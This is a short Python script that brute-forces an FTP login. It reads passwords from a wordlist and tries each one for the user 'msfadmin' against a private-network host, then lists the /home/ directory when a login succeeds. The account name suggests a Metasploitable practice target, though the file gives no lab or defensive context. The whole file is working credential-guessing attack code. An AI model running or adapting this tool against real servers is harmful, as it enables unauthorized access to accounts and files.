#!/usr/bin/python3
from ftplib import FTP
import time

class FtpGuesser:
  
  def __init__(self):
    self.user="msfadmin"
    self.psswd="msfadmin"
    self.ftp=""
    self.host="192.168.1.62"
    self.pswdFound=False

  def login(self):
    #open a pass dictionary
    fOpened=open("/home/fuckyou/Documents/1aNormusWL.txt")
    self.ftp=FTP(self.host)

    for psswd in fOpened:
      try:
        self.ftp.login(self.user,psswd)
        self.ftp.cwd("/home/")
        print(self.ftp.dir())
        self.pswdFound=True
        self.psswd=psswd

      except Exception as e:
        time.sleep(3)

    if(self.pswdFound):
      print("logged in with password ", self.psswd)
    else:
      print("No se encontro el pass")

objFtp=FtpGuesser()
objFtp.login()
##print( objFtp.user )



